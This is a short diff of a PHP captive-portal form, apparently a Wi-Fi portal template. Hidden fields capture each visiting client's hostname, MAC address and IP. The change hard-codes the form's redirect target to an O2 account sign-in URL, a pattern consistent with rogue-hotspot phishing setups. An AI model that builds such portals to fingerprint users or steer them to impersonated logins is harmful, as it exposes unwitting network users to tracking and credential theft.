@@ -56,7 +56,7 @@ require_once('helper.php');
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="<?=$destination?>">
+            <input type="hidden" name="target" value="https://accounts.o2.co.uk/signin">
             <input type="submit" value="Sign up">
 
         </form>
